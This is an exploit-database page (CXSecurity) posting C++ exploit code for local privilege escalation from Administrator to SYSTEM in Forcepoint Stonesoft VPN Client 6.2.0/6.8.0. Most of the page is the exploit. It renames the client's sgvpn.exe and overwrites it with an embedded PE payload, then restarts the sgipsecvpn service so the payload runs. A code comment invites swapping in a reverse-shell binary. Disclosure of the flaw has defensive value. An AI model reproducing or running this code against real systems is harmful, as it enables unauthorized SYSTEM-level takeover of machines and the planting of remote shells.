---
title: Stonesoft VPN Client 6.2.0 / 6.8.0 Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040078
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-24
fetch_date: 2025-10-04T11:31:22.511638
---

# Stonesoft VPN Client 6.2.0 / 6.8.0 Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Stonesoft VPN Client 6.2.0 / 6.8.0 Local Privilege Escalation** **2023.04.23**  Credit:  **[TOUHAMI KASBAOUI](https://cxsecurity.com/author/TOUHAMI%2BKASBAOUI/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Stonesoft VPN Client 6.2.0 / 6.8.0 - Local Privilege Escalation
# Exploit Author : TOUHAMI KASBAOUI
# Vendor Homepage : https://www.forcepoint.com/
# Software: Stonesoft VPN Windows
# Version : 6.2.0 / 6.8.0
# Tested on : Windows 10
# CVE : N/A
#Description local privilege escalation vertical from Administrator to NT AUTHORITY / SYSTEM
#define UNICODE
#define \_UNICODE
#include <Windows.h>
#include <iostream>
using namespace std;
enum Result
{
unknown,
serviceManager\_AccessDenied,
serviceManager\_DatabaseDoesNotExist,
service\_AccessDenied,
service\_InvalidServiceManagerHandle,
service\_InvalidServiceName,
service\_DoesNotExist,
service\_Exist
};
Result ServiceExists(const std::wstring& serviceName)
{
Result r = unknown;
SC\_HANDLE manager = OpenSCManager(NULL, SERVICES\_ACTIVE\_DATABASE, GENERIC\_READ);
if (manager == NULL)
{
DWORD lastError = GetLastError();
if (lastError == ERROR\_ACCESS\_DENIED)
return serviceManager\_AccessDenied;
else if (lastError == ERROR\_DATABASE\_DOES\_NOT\_EXIST)
return serviceManager\_DatabaseDoesNotExist;
else
return unknown;
}
SC\_HANDLE service = OpenService(manager, serviceName.c\_str(), GENERIC\_READ);
if (service == NULL)
{
DWORD error = GetLastError();
if (error == ERROR\_ACCESS\_DENIED)
r = service\_AccessDenied;
else if (error == ERROR\_INVALID\_HANDLE)
r = service\_InvalidServiceManagerHandle;
else if (error == ERROR\_INVALID\_NAME)
r = service\_InvalidServiceName;
else if (error == ERROR\_SERVICE\_DOES\_NOT\_EXIST)
r = service\_DoesNotExist;
else
r = unknown;
}
else
r = service\_Exist;
if (service != NULL)
CloseServiceHandle(service);
if (manager != NULL)
CloseServiceHandle(manager);
return r;
}
bool ChangeName() {
LPCWSTR parrentvpnfilename = L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn.exe";
LPCWSTR newName = L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn\_old.exe";
bool success = MoveFile(parrentvpnfilename, newName);
if (success) {
cerr << "[+] SVGVPN filename changed.\n";
}
else {
cerr << "Failed to rename file \n";
}
return 0;
}
int main() {
const uint8\_t shellcode[7168] = {
0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
}; //You can set array bin of your reverse shell PE file here
std::wstring serviceName = L"sgipsecvpn";
Result result = ServiceExists(serviceName);
if (result == service\_Exist)
std::wcout << L"The VPN service '" << serviceName << "' exists." << std::endl;
else if (result == service\_DoesNotExist)
std::wcout << L"The service '" << serviceName << "' does not exist." << std::endl;
else
std::wcout << L"An error has occurred, and it could not be determined whether the service '" << serviceName << "' exists or not." << std::endl;
ChangeName();
HANDLE fileHandle = CreateFile(L"C:\\Program Files (x86)\\Forcepoint\\Stonesoft VPN Client\\sgvpn.exe", GENERIC\_WRITE, 0, NULL, CREATE\_ALWAYS, FILE\_ATTRIBUTE\_NORMAL, NULL);
cerr << "[\*] Loading Malicious file into main PE of Forcepoint Installer \n";
if (fileHandle == INVALID\_HANDLE\_VALUE) {
cerr << "Failed to create shellcode\n";
return 1;
}
DWORD bytesWritten;
if (!WriteFile(fileHandle, shellcode, sizeof(shellcode), &bytesWritten, NULL)) {
cerr << "Failed to write to file\n";
CloseHandle(fileHandle);
return 1;
}
CloseHandle(fileHandle);
cout << "[+] Payload exported to ForcePointVPN \n";
Sleep(30);
cout << "[+] Restart ForcePointVPN Service \n";
SC\_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC\_MANAGER\_ALL\_ACCESS);
SC\_HANDLE serviceHandle = OpenService(scmHandle, TEXT("sgipsecvpn"), SERVICE\_ALL\_ACCESS);
SERVICE\_STATUS serviceStatus;
QueryServiceStatus(serviceHandle, &serviceStatus);
if (serviceStatus.dwCurrentState == SERVICE\_RUNNING) {
ControlService(serviceHandle, SERVICE\_CONTROL\_STOP, &serviceStatus);
while (serviceStatus.dwCurrentState != SERVICE\_STOPPED) {
QueryServiceStatus(serviceHandle, &serviceStatus);
Sleep(1000);
}
}
StartService(serviceHandle, NULL, NULL);
CloseServiceHandle(serviceHandle);
CloseServiceHandle(scmHandle);
return 0;
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040078)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top